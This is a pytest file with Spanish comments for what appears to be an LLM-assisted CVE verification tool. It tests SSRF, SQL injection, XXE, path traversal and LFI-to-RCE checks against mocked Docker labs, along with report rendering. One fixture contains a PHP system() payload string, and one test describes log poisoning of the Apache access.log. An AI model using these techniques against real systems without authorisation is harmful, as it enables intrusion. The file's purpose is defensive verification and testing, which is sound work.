    from binoracle.workflows import websource, wpverify

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(ok=True, kind="wordpress-plugin", source=target,
                                           local_path=str(tmp_path), plugin_dir="some-plugin")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    class _FakeLLM:
        def available(self):
            return True
        def chat(self, messages, json_mode=True):
            return _json.dumps({
                "tiene_sugerencia": True,
                "razon": "el cuerpo muestra un error de la propia app, no un comportamiento SSRF normal",
                "endpoint_alternativo": "/wp-admin/admin-ajax.php?action=fetch_remote",
            })

    calls = []
    def fake_ssrf(plugin_source_dir, slug, endpoint, http_method, parameters,
                 url_param_hint="", on_step=None, budget_s=1200.0, companion_plugins=None):
        calls.append(endpoint)
        if "fetch_remote" not in (endpoint or ""):
            wr = wpverify.WpVerifyResult(ok=True, available=True, verified=False,
                                         detail="no se confirmo")
            wr.evidence = {"respuesta_cuerpo_recorte": "<html>400 bad request</html>"}
            return wr
        return wpverify.WpVerifyResult(ok=True, available=True, verified=True,
                                       detail="SSRF confirmado tras el reintento (fake)")
    monkeypatch.setattr(wpverify, "verify_wordpress_ssrf", fake_ssrf)

    inv = Investigation(cve_id="CVE-2099-00023")
    inv.vuln_class = "ssrf"
    inv.llm_notes = {"source_url": "some-plugin", "endpoint": "/wp-admin/admin-ajax.php?action=x",
                     "http_method": "GET", "parameters": {"url": "x"},
                     "vulnerable_functions": []}
    _run_web_investigation(inv, lang="es", step=lambda m: None, llm=_FakeLLM())

    assert calls == ["/wp-admin/admin-ajax.php?action=x",
                     "/wp-admin/admin-ajax.php?action=fetch_remote"]
    assert inv.verified is True
    assert "sugerido por el LLM" in inv.verified_detail


def test_cve_agent_sqli_blind_retries_with_llm_suggestion(monkeypatch, tmp_path):
    # sqli_blind se habia dejado fuera porque el oraculo es puramente temporal y timed_send
    # descartaba la respuesta entera -- tras capturar el cuerpo de la peticion de CONTROL
    # (independiente de los tiempos), ya tiene sentido conectarlo.
    import json as _json
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource, genericverify
    from binoracle.workflows.wpverify import WpVerifyResult

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(ok=True, kind="git", source=target,
                                           local_path=str(tmp_path), plugin_dir="")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    class _FakeLLM:
        def available(self):
            return True
        def chat(self, messages, json_mode=True):
            return _json.dumps({
                "tiene_sugerencia": True,
                "razon": "la respuesta de control muestra un 403 forbidden",
                "endpoint_alternativo": "/api/search",
            })

    calls = []
    def fake_sqli_blind(source_dir, endpoint, http_method, parameters, sqli_param_hint="",
                        on_step=None, budget_s=900.0):
        calls.append(endpoint)
        if endpoint == "/query":
            wr = WpVerifyResult(ok=True, available=True, verified=False, detail="no se confirmo")
            wr.evidence = {"respuesta_control_recorte": "<html>403 forbidden</html>"}
            return wr
        return WpVerifyResult(ok=True, available=True, verified=True,
                              detail="SQLI CIEGA POR TIEMPO confirmada tras el reintento (fake)")
    monkeypatch.setattr(genericverify, "verify_generic_sqli_blind", fake_sqli_blind)

    inv = Investigation(cve_id="CVE-2099-00024")
    inv.vuln_class = "sqli"
    inv.llm_notes = {"source_url": "https://example.com/some-generic-app.git",
                     "endpoint": "/query", "http_method": "GET", "parameters": {"q": "x"},
                     "vulnerable_functions": []}
    _run_web_investigation(inv, lang="es", step=lambda m: None, llm=_FakeLLM())

    assert calls == ["/query", "/api/search"]
    assert inv.verified is True
    assert "sugerido por el LLM" in inv.verified_detail


def test_genericverify_sqli_blind_captures_control_response_body(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv

    class _FakeLab:
        def teardown(self):
            pass

    def fake_http_request(method, url, **kw):
        class _R:
            status_code = 404
            text = "<html>not found</html>"
        return _R()

    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: True)
    monkeypatch.setattr(gv, "_bootstrap_generic_lab",
                        lambda *a, **kw: (_FakeLab(), "http://lab.invalid", "app"))
    monkeypatch.setattr(gv, "_http_request", fake_http_request)

    res = gv.verify_generic_sqli_blind(str(tmp_path), "/query", "GET", {"q": "1"},
                                       sqli_param_hint="q")
    assert res.verified is False
    assert "not found" in res.evidence.get("respuesta_control_recorte", "")


def test_cve_agent_drupal_ssrf_retries_with_llm_suggestion(monkeypatch, tmp_path):
    import json as _json
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource, drupalverify

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(ok=True, kind="drupal-module", source=target,
                                           local_path=str(tmp_path), plugin_dir="some_module")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    class _FakeLLM:
        def available(self):
            return True
        def chat(self, messages, json_mode=True):
            return _json.dumps({
                "tiene_sugerencia": True,
                "razon": "la respuesta del propio endpoint muestra un error de acceso denegado",
                "endpoint_alternativo": "/node/1/fetch-remote",
            })

    calls = []
    def fake_ssrf(module_source_dir, slug, endpoint, http_method, parameters,
                 url_param_hint="", on_step=None, budget_s=1200.0):
        calls.append(endpoint)
        if "fetch-remote" not in (endpoint or ""):
            wr = drupalverify.WpVerifyResult(ok=True, available=True, verified=False,
                                             detail="no se confirmo")
            wr.evidence = {"respuesta_muestra_primer_intento": "<html>access denied</html>"}
            return wr
        return drupalverify.WpVerifyResult(ok=True, available=True, verified=True,
                                           detail="SSRF confirmado tras el reintento (fake)")
    monkeypatch.setattr(drupalverify, "verify_drupal_ssrf", fake_ssrf)

    inv = Investigation(cve_id="CVE-2099-00025")
    inv.vuln_class = "ssrf"
    inv.llm_notes = {"source_url": "some_module", "endpoint": "/node/1",
                     "http_method": "GET", "parameters": {"url": "x"},
                     "vulnerable_functions": []}
    _run_web_investigation(inv, lang="es", step=lambda m: None, llm=_FakeLLM())

    assert calls == ["/node/1", "/node/1/fetch-remote"]
    assert inv.verified is True
    assert "sugerido por el LLM" in inv.verified_detail


def test_genericverify_command_injection_surfaces_real_response_body_on_negative(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv

    class _FakeLab:
        def teardown(self):
            pass
        def read_file(self, container, path):
            return ""

    def fake_http_request(method, url, **kw):
        class _R:
            status_code = 404
            text = "<html>not found</html>"
        return _R()

    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: True)
    monkeypatch.setattr(gv, "_bootstrap_generic_lab",
                        lambda *a, **kw: (_FakeLab(), "http://lab.invalid", "app"))
    import time as _time_mod
    monkeypatch.setattr(_time_mod, "sleep", lambda *a: None)
    monkeypatch.setattr(gv, "_http_request", fake_http_request)

    res = gv.verify_generic_command_injection(str(tmp_path), "/run", "GET", {"cmd": "x"},
                                               cmd_param_hint="cmd")
    assert res.verified is False
    assert "not found" in res.evidence.get("respuesta_cuerpo_recorte", "")


def test_cve_agent_generic_xxe_retries_with_llm_suggestion(monkeypatch, tmp_path):
    import json as _json
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource, genericverify
    from binoracle.workflows.wpverify import WpVerifyResult

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(ok=True, kind="git", source=target,
                                           local_path=str(tmp_path), plugin_dir="")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    class _FakeLLM:
        def available(self):
            return True
        def chat(self, messages, json_mode=True):
            return _json.dumps({
                "tiene_sugerencia": True,
                "razon": "el cuerpo muestra un error de parseo XML distinto del esperado",
                "endpoint_alternativo": "/api/v2/import",
            })

    calls = []
    def fake_xxe(source_dir, endpoint, http_method, parameters, xml_param_hint="",
                on_step=None, budget_s=900.0):
        calls.append(endpoint)
        if endpoint == "/import":
            wr = WpVerifyResult(ok=True, available=True, verified=False, detail="no se confirmo")
            wr.evidence = {"respuesta_cuerpo_recorte": "<error>bad xml</error>"}
            return wr
        return WpVerifyResult(ok=True, available=True, verified=True,
                              detail="XXE confirmado tras el reintento (fake)")
    monkeypatch.setattr(genericverify, "verify_generic_xxe", fake_xxe)

    inv = Investigation(cve_id="CVE-2099-00017")
    inv.vuln_class = "xxe"
    inv.llm_notes = {"source_url": "https://example.com/some-generic-app.git",
                     "endpoint": "/import", "http_method": "POST", "parameters": {"xml": "x"},
                     "vulnerable_functions": []}
    _run_web_investigation(inv, lang="es", step=lambda m: None, llm=_FakeLLM())

    assert calls == ["/import", "/api/v2/import"]
    assert inv.verified is True
    assert "sugerido por el LLM" in inv.verified_detail


def test_cve_agent_generic_path_traversal_retries_with_llm_suggestion(monkeypatch, tmp_path):
    # pedido explicitamente: el bucle de aprendizaje-y-reintento no se queda en WordPress -- debe
    # funcionar igual para el verificador GENERICO (cualquier tecnologia con su propio Dockerfile).
    import json as _json
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource, genericverify
    from binoracle.workflows.wpverify import WpVerifyResult

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(ok=True, kind="git", source=target,
                                           local_path=str(tmp_path), plugin_dir="")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    class _FakeLLM:
        def available(self):
            return True
        def chat(self, messages, json_mode=True):
            return _json.dumps({
                "tiene_sugerencia": True,
                "razon": "el primer intento devolvio 404 not found",
                "endpoint_alternativo": "/api/v2/files",
            })

    calls = []
    def fake_pt(local_path, endpoint, method, params, path_param_hint="", on_step=None,
               budget_s=900.0):
        calls.append(endpoint)
        if endpoint == "/view":
            wr = WpVerifyResult(ok=True, available=True, verified=False, detail="no se confirmo")
            wr.evidence = {"endpoint": "/view", "path_param": path_param_hint,
                          "respuesta_muestra_primer_intento": '{"error":"not found"}'}
            return wr
        return WpVerifyResult(ok=True, available=True, verified=True,
                              detail="PATH TRAVERSAL confirmado tras el reintento (fake)")
    monkeypatch.setattr(genericverify, "verify_generic_path_traversal", fake_pt)
    monkeypatch.setattr(genericverify, "verify_generic_lfi_rce",
                        lambda *a, **kw: WpVerifyResult(ok=True, available=True, verified=False,
                                                        detail="no aplica (fake)"))

    inv = Investigation(cve_id="CVE-2099-00014")
    inv.vuln_class = "path-traversal"
    inv.llm_notes = {"source_url": "https://example.com/some-generic-app.git",
                     "endpoint": "/view", "http_method": "GET", "parameters": {"page": "x"},
                     "vulnerable_functions": []}
    _run_web_investigation(inv, lang="es", step=lambda m: None, llm=_FakeLLM())

    assert calls == ["/view", "/api/v2/files"]
    assert inv.verified is True
    assert "sugerido por el LLM" in inv.verified_detail


def test_cve_agent_wordpress_path_traversal_retries_with_llm_suggestion(monkeypatch, tmp_path):
    import json as _json
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource, wpverify

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(ok=True, kind="wordpress-plugin", source=target,
                                           local_path=str(tmp_path), plugin_dir="some-plugin")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    class _FakeLLM:
        def available(self):
            return True
        def chat(self, messages, json_mode=True):
            return _json.dumps({
                "tiene_sugerencia": True,
                "razon": "File is not moved en la respuesta de control",
                "endpoint_alternativo": "/wp-admin/admin-ajax.php?action=otra_accion",
            })

    calls = []
    def fake_pt(plugin_dir_path, slug, endpoint, method, params, **kw):
        calls.append(endpoint)
        if "otra_accion" not in (endpoint or ""):
            wr = wpverify.WpVerifyResult(ok=True, available=True, verified=False,
                                         detail="no se confirmo")
            wr.evidence = {"endpoint": endpoint, "path_param": kw.get("path_param_hint"),
                          "respuesta_muestra_primer_intento": '{"status":"error","message":"File is not moved"}'}
            return wr
        return wpverify.WpVerifyResult(ok=True, available=True, verified=True,
                                       detail="PATH TRAVERSAL confirmado tras el reintento (fake)")
    monkeypatch.setattr(wpverify, "verify_wordpress_path_traversal", fake_pt)

    inv = Investigation(cve_id="CVE-2099-00015")
    inv.vuln_class = "path-traversal"
    inv.llm_notes = {"source_url": "some-plugin", "endpoint": "/wp-admin/admin-ajax.php?action=x",
                     "http_method": "GET", "parameters": {"file": "x"},
                     "vulnerable_functions": []}
    _run_web_investigation(inv, lang="es", step=lambda m: None, llm=_FakeLLM())

    assert calls == ["/wp-admin/admin-ajax.php?action=x",
                     "/wp-admin/admin-ajax.php?action=otra_accion"]
    assert inv.verified is True
    assert "sugerido por el LLM" in inv.verified_detail


def test_genericverify_lfi_rce_blocked_without_param(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: True)
    res = gv.verify_generic_lfi_rce(str(tmp_path), "/view", "GET", {})
    assert res.verified is False
    assert res.limitations
    assert "parametro" in res.limitations[0]


def test_genericverify_lfi_rce_blocked_without_build_target(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: True)
    (tmp_path / "README.md").write_text("no docker here\n")
    res = gv.verify_generic_lfi_rce(str(tmp_path), "/view", "GET", {"page": "x"},
                                    path_param_hint="page")
    assert res.verified is False
    assert res.limitations
    assert "Dockerfile" in res.limitations[0]


def test_genericverify_lfi_rce_confirms_only_on_real_execution(monkeypatch, tmp_path):
    # el punto central: solo se marca verificado si el marcador aparece EJECUTADO (resultado de
    # system(), sin las etiquetas '<?php' alrededor) -- el payload crudo reflejado (con '<?php'
    # literal en la respuesta) demuestra LECTURA, nunca ejecucion, y no debe confundirse con RCE.
    import binoracle.workflows.genericverify as gv

    class _FakeLab:
        def teardown(self):
            pass

    marker = "binoracle_lfi_rce_fixedtoken1234"

    def fake_http_request(method, url, **kw):
        class _R:
            def __init__(self, status_code, text):
                self.status_code = status_code
                self.text = text
        if "headers" in kw:
            return _R(200, "")   # peticion de envenenamiento del log
        params = kw.get("params") or kw.get("data") or {}
        path_value = params.get("page", "")
        # la ruta de log "buena" (la primera, sin traversal) ejecuta de verdad
        if path_value == "/var/log/apache2/access.log":
            return _R(200, f"some output {marker} more output")
        return _R(200, "<html>not found</html>")

    import time as _time_mod
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: True)
    monkeypatch.setattr(gv, "_bootstrap_generic_lab",
                        lambda *a, **kw: (_FakeLab(), "http://lab.invalid", "app"))
    monkeypatch.setattr(_time_mod, "sleep", lambda *a: None)
    monkeypatch.setattr(gv, "_token", lambda: "fixedtoken1234")
    monkeypatch.setattr(gv, "_http_request", fake_http_request)

    res = gv.verify_generic_lfi_rce(str(tmp_path), "/view", "GET", {"page": "x"},
                                    path_param_hint="page")

    assert res.verified is True
    assert "LFI-A-RCE confirmado" in res.detail
    assert res.evidence.get("payload_ganador") == "/var/log/apache2/access.log"


def test_genericverify_lfi_rce_raw_reflection_is_not_confirmed(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv

    class _FakeLab:
        def teardown(self):
            pass

    def fake_http_request(method, url, **kw):
        class _R:
            status_code = 200
            text = "<?php system('echo binoracle_lfi_rce_x'); ?> binoracle_lfi_rce_x"
        return _R()

    import time as _time_mod
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: True)
    monkeypatch.setattr(gv, "_bootstrap_generic_lab",
                        lambda *a, **kw: (_FakeLab(), "http://lab.invalid", "app"))
    monkeypatch.setattr(_time_mod, "sleep", lambda *a: None)
    monkeypatch.setattr(gv, "_token", lambda: "x")
    monkeypatch.setattr(gv, "_http_request", fake_http_request)

    res = gv.verify_generic_lfi_rce(str(tmp_path), "/view", "GET", {"page": "x"},
                                    path_param_hint="page")

    assert res.verified is False   # reflejado crudo, NUNCA se confunde con ejecucion
    assert "no se confirmo" in res.detail
    assert "LECTURA" in res.detail


def test_render_investigation_shows_screenshots_from_a_blocked_attempt():
    # bug real encontrado en vivo, CVE-2024-1071 (demo real contra Ultimate Member): el
    # laboratorio efimero capturaba varias pantallas REALES (WordPress instalado, plugin
    # activo, subscriber creado) antes de bloquearse en el login -- pero el informe las
    # descartaba por completo porque solo mostraba capturas cuando inv.verified=True.
    # render_investigation debe mostrarlas igual, como evidencia de hasta donde llego el
    # intento, usando inv.attempt_evidence (no inv.verified_evidence, que exige verified=True).
    from binoracle.workflows.cve_agent import Investigation, render_investigation

    inv = Investigation(cve_id="CVE-2099-00026")
    inv.vuln_class = "sqli"
    inv.verified = False
    inv.dynamic_verify = {"attempted": True, "available": True, "ok": True,
                          "verified": False, "detail": "no se pudo iniciar sesion", "logs": []}
    inv.attempt_evidence = {
        "screenshots": [
            {"caption_es": "Paso 1: WordPress instalado", "caption_en": "Step 1: WP installed",
             "png_b64": "ZmFrZXBuZw==", "url": "http://lab.invalid/wp-login.php"},
            {"caption_es": "Paso 3: subscriber creado", "caption_en": "Step 3: subscriber created",
             "png_b64": "ZmFrZXBuZzI=", "url": "http://lab.invalid/wp-admin/users.php"},
        ]
    }
    inv.blockers.append("verificacion dinamica intentada pero no confirmada: no se pudo "
                        "iniciar sesion")

    md = render_investigation(inv, lang="es", embed_images=True)
    assert "Evidencia visual del intento" in md
    assert "WordPress instalado" in md and "subscriber creado" in md
    assert "ZmFrZXBuZw==" in md and "ZmFrZXBuZzI=" in md   # ambas imagenes embebidas, no solo una


def test_render_investigation_includes_executive_summary_and_recommendations():
    # el informe debe poder entregarse a un cliente sin retocarlo: resumen ejecutivo con la
    # severidad REAL (CVSS de NVD si consta, no solo nuestra tabla por clase) arriba de todo, y
    # una seccion de recomendaciones concreta y accionable al final -- no solo el detalle tecnico
    # de la investigacion.
    from binoracle.workflows.cve_agent import Investigation, render_investigation

    inv = Investigation(cve_id="CVE-2024-1071")
    inv.vuln_class = "sqli"
    inv.cvss_score = 9.8
    inv.cvss_severity = "CRITICAL"
    inv.cvss_vector = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    inv.published = "2024-03-01T00:00:00.000"
    inv.llm_notes = {"target_binary": "Ultimate Member", "affected_version": "2.1.3-2.8.2"}
    inv.verified = False
    inv.dynamic_verify = {"attempted": True}

    md = render_investigation(inv, lang="es", embed_images=True)
    assert "Resumen ejecutivo" in md
    assert "CVSS 9.8 (CRITICAL)" in md
    assert "2024-03-01T00:00:00.000" in md
    assert "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" in md
    assert "intentado, no confirmado" in md
    assert "Recomendaciones" in md
    assert "Ultimate Member" in md and "2.1.3-2.8.2" in md
    assert "prepared statements" in md or "parametrizadas" in md


def test_render_investigation_falls_back_to_class_severity_without_cvss():
    # sin CVSS de NVD (offline, o la CVE no lo trae) la severidad debe seguir mostrandose, usando
    # nuestra tabla por clase -- nunca dejar el resumen ejecutivo vacio de severidad.
    from binoracle.workflows.cve_agent import Investigation, render_investigation

    inv = Investigation(cve_id="CVE-2024-9999")
    inv.vuln_class = "sqli"
    inv.cvss_score = None
    md = render_investigation(inv, lang="es", embed_images=True)
    assert "Resumen ejecutivo" in md
    assert "CRITICO" in md
    assert "estimado por tipo de vulnerabilidad" in md


def test_cve_agent_escalates_path_traversal_to_lfi_rce_when_available(monkeypatch, tmp_path):
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource, genericverify

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(ok=True, kind="git", source=target,
                                           local_path=str(tmp_path), plugin_dir="")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    from binoracle.workflows.wpverify import WpVerifyResult

    def fake_pt(local_path, endpoint, method, params, path_param_hint="", on_step=None,
               budget_s=900.0):
        return WpVerifyResult(ok=True, available=True, verified=False,
                              detail="no se confirmo el traversal de solo lectura (fake)")
    monkeypatch.setattr(genericverify, "verify_generic_path_traversal", fake_pt)

    called = {}
    def fake_lfi_rce(local_path, endpoint, method, params, path_param_hint="", on_step=None,
                     budget_s=900.0):
        called["ran"] = True
        return WpVerifyResult(ok=True, available=True, verified=True,
                              detail="LFI-A-RCE confirmado (fake)")
    monkeypatch.setattr(genericverify, "verify_generic_lfi_rce", fake_lfi_rce)

    inv = Investigation(cve_id="CVE-2099-00011")
    inv.vuln_class = "path-traversal"
    inv.llm_notes = {"source_url": "https://example.com/some-generic-app.git",
                     "endpoint": "/view", "http_method": "GET", "parameters": {"page": "x"},
                     "vulnerable_functions": []}
    _run_web_investigation(inv, lang="es", step=lambda m: None)
    assert called.get("ran") is True
    assert inv.verified is True   # la escalada pisa el resultado con el hallazgo mas fuerte
    assert "LFI-A-RCE" in inv.verified_detail


def test_llm_suggest_retry_from_evidence_returns_none_without_llm():
    from binoracle.workflows.cve_agent import (_llm_suggest_retry_from_evidence, _SQLI_RETRY_SYS,
                                                _SQLI_RETRY_EVIDENCE_KEYS)
    from binoracle.workflows.wpverify import WpVerifyResult
    wr = WpVerifyResult(detail="no se confirmo")
    assert _llm_suggest_retry_from_evidence(
        None, _SQLI_RETRY_SYS, wr, _SQLI_RETRY_EVIDENCE_KEYS) is None


def test_llm_suggest_retry_from_evidence_respects_no_suggestion():
    # el propio prompt le pide al LLM decir honestamente cuando NO hay ninguna pista util en la
    # evidencia real -- _llm_suggest_retry_from_evidence debe respetar eso devolviendo None, no
    # forzar un reintento a ciegas.
    import json as _json
    from binoracle.workflows.cve_agent import (_llm_suggest_retry_from_evidence, _SQLI_RETRY_SYS,
                                                _SQLI_RETRY_EVIDENCE_KEYS)
    from binoracle.workflows.wpverify import WpVerifyResult

    class _FakeLLM:
        def available(self):
            return True
        def chat(self, messages, json_mode=True):
            return _json.dumps({"tiene_sugerencia": False,
                                "razon": "la respuesta de control parece normal, sin pistas"})

    wr = WpVerifyResult(detail="no se confirmo")
    wr.evidence = {"endpoint": "/", "sqli_param": "id",
                  "respuesta_control_recorte": "<html>pagina normal</html>"}
    assert _llm_suggest_retry_from_evidence(
        _FakeLLM(), _SQLI_RETRY_SYS, wr, _SQLI_RETRY_EVIDENCE_KEYS) is None


def test_llm_suggest_retry_from_evidence_returns_concrete_suggestion():
    import json as _json
    from binoracle.workflows.cve_agent import (_llm_suggest_retry_from_evidence, _SQLI_RETRY_SYS,
                                                _SQLI_RETRY_EVIDENCE_KEYS)
    from binoracle.workflows.wpverify import WpVerifyResult

    class _FakeLLM:
        def available(self):
            return True
        def chat(self, messages, json_mode=True):
            return _json.dumps({
                "tiene_sugerencia": True,
                "razon": "la respuesta de control es 'Page not found', el endpoint no existe",
                "endpoint_alternativo": "/?page_id=6", "parametro_alternativo": "w2dc_level_filter",
            })

    wr = WpVerifyResult(detail="no se confirmo")
    wr.evidence = {"endpoint": "/", "sqli_param": "id",
                  "respuesta_control_recorte": "<title>Page not found</title>"}
    suggestion = _llm_suggest_retry_from_evidence(
        _FakeLLM(), _SQLI_RETRY_SYS, wr, _SQLI_RETRY_EVIDENCE_KEYS)
    assert suggestion["endpoint_alternativo"] == "/?page_id=6"
    assert suggestion["parametro_alternativo"] == "w2dc_level_filter"


def test_llm_suggest_retry_from_evidence_ignores_malformed_json():
    from binoracle.workflows.cve_agent import (_llm_suggest_retry_from_evidence, _SQLI_RETRY_SYS,
                                                _SQLI_RETRY_EVIDENCE_KEYS)
    from binoracle.workflows.wpverify import WpVerifyResult

    class _FakeLLM:
        def available(self):
            return True
        def chat(self, messages, json_mode=True):
            return "no es json valido"

    wr = WpVerifyResult(detail="no se confirmo")
    wr.evidence = {}
    assert _llm_suggest_retry_from_evidence(
        _FakeLLM(), _SQLI_RETRY_SYS, wr, _SQLI_RETRY_EVIDENCE_KEYS) is None


def test_llm_suggest_retry_from_evidence_is_generic_across_techniques():
    # pedido explicitamente: no quedarse en WordPress/SQLi -- el helper debe servir para
    # CUALQUIER verificador (distinto system prompt, distinta evidencia) sin duplicar codigo.
    import json as _json
    from binoracle.workflows.cve_agent import (_llm_suggest_retry_from_evidence,
                                                _PATH_TRAVERSAL_RETRY_SYS)
    from binoracle.workflows.wpverify import WpVerifyResult

    class _FakeLLM:
        def available(self):
            return True
        def chat(self, messages, json_mode=True):
            return _json.dumps({
                "tiene_sugerencia": True,
                "razon": "el primer intento devolvio 'File is not moved'",
                "endpoint_alternativo": "/wp-admin/admin-ajax.php?action=otra_accion",
            })

    wr = WpVerifyResult(detail="no se confirmo")
    wr.evidence = {"endpoint": "/wp-admin/admin-ajax.php?action=x", "path_param": "file",
                  "respuesta_muestra_para_llm": '{"status":"error","message":"File is not moved"}'}
    suggestion = _llm_suggest_retry_from_evidence(
        _FakeLLM(), _PATH_TRAVERSAL_RETRY_SYS, wr,
        {"endpoint_probado": "endpoint", "parametro_probado": "path_param",
         "respuesta_cuerpo_recorte": "respuesta_muestra_para_llm"})
    assert suggestion["endpoint_alternativo"] == "/wp-admin/admin-ajax.php?action=otra_accion"


def test_cve_agent_sqli_retries_once_with_llm_suggestion_from_real_evidence(monkeypatch, tmp_path):
    # el punto central pedido explicitamente: que el LLM razone sobre la evidencia REAL (el
    # cuerpo de la respuesta de control) y, si ve una pista concreta, se reintente una vez con un
    # endpoint/parametro distinto -- automatizando el mismo paso de aprendizaje-y-error que se
    # hizo a mano en vivo con CVE-2024-3552.
    import json as _json
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource, wpverify

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(ok=True, kind="wordpress-plugin", source=target,
                                           local_path=str(tmp_path), plugin_dir="web-directory-free")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    class _FakeLLM:
        def available(self):
            return True
        def chat(self, messages, json_mode=True):
            return _json.dumps({
                "tiene_sugerencia": True,
                "razon": "Page not found en la respuesta de control",
                "endpoint_alternativo": "/?page_id=6",
                "parametro_alternativo": "w2dc_level_filter",
            })

    calls = []
    def fake_sqli(plugin_dir_path, slug, endpoint, method, params, **kw):
        calls.append(endpoint)
        if endpoint == "/":
            wr = wpverify.WpVerifyResult(ok=True, available=True, verified=False,
                                         detail="no se confirmo")
            wr.evidence = {"endpoint": "/", "sqli_param": kw.get("sqli_param_hint"),
                          "respuesta_control_recorte": "<title>Page not found</title>"}
            return wr
        return wpverify.WpVerifyResult(ok=True, available=True, verified=True,
                                       detail="SQLI confirmada tras el reintento (fake)")
    monkeypatch.setattr(wpverify, "verify_wordpress_sqli", fake_sqli)

    inv = Investigation(cve_id="CVE-2099-00012")
    inv.vuln_class = "sqli"
    inv.llm_notes = {"source_url": "web-directory-free", "endpoint": "/", "http_method": "GET",
                     "parameters": {"w2dc_level_filter": "1"},
                     "vulnerable_functions": []}
    _run_web_investigation(inv, lang="es", step=lambda m: None, llm=_FakeLLM())

    assert calls == ["/", "/?page_id=6"]    # el primer intento, y el reintento sugerido
    assert inv.verified is True
    assert "sugerido por el LLM" in inv.verified_detail
    assert "SQLI confirmada tras el reintento" in inv.verified_detail


def test_cve_agent_sqli_retry_loop_is_bounded_not_infinite(monkeypatch, tmp_path):
    # bucle ACOTADO: si el LLM sigue sugiriendo algo "nuevo" sin que nada se confirme nunca, el
    # numero de intentos totales (inicial + reintentos) no debe superar _SQLI_RETRY_MAX_ATTEMPTS
    # -- cada intento levanta un laboratorio Docker real entero, un bucle sin limite podria no
    # terminar nunca.
    import json as _json
    from binoracle.workflows.cve_agent import (Investigation, _run_web_investigation,
                                                _SQLI_RETRY_MAX_ATTEMPTS)
    from binoracle.workflows import websource, wpverify

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(ok=True, kind="wordpress-plugin", source=target,
                                           local_path=str(tmp_path), plugin_dir="web-directory-free")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    suggestion_n = {"n": 0}

    class _FakeLLM:
        def available(self):
            return True
        def chat(self, messages, json_mode=True):
            suggestion_n["n"] += 1
            return _json.dumps({
                "tiene_sugerencia": True,
                "razon": f"pista {suggestion_n['n']} (fake, nunca confirma de verdad)",
                "endpoint_alternativo": f"/intento-{suggestion_n['n']}",
            })

    calls = []
    def fake_sqli(plugin_dir_path, slug, endpoint, method, params, **kw):
        calls.append(endpoint)
        wr = wpverify.WpVerifyResult(ok=True, available=True, verified=False,
                                     detail="no se confirmo")
        wr.evidence = {"endpoint": endpoint, "sqli_param": kw.get("sqli_param_hint"),
                      "respuesta_control_recorte": "<title>Page not found</title>"}
        return wr
    monkeypatch.setattr(wpverify, "verify_wordpress_sqli", fake_sqli)

    inv = Investigation(cve_id="CVE-2099-00013")
    inv.vuln_class = "sqli"
    inv.llm_notes = {"source_url": "web-directory-free", "endpoint": "/", "http_method": "GET",
                     "parameters": {"w2dc_level_filter": "1"}, "vulnerable_functions": []}
    _run_web_investigation(inv, lang="es", step=lambda m: None, llm=_FakeLLM())

    assert len(calls) == _SQLI_RETRY_MAX_ATTEMPTS   # nunca mas de este tope
    assert inv.verified is False


def test_genericverify_file_upload_blocked_without_build_target(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: True)
    (tmp_path / "README.md").write_text("no docker here\n")
    res = gv.verify_generic_file_upload(str(tmp_path), "/upload")
    assert res.verified is False
    assert res.limitations
    assert "Dockerfile" in res.limitations[0]


def test_genericverify_file_upload_blocked_without_docker(monkeypatch, tmp_path):
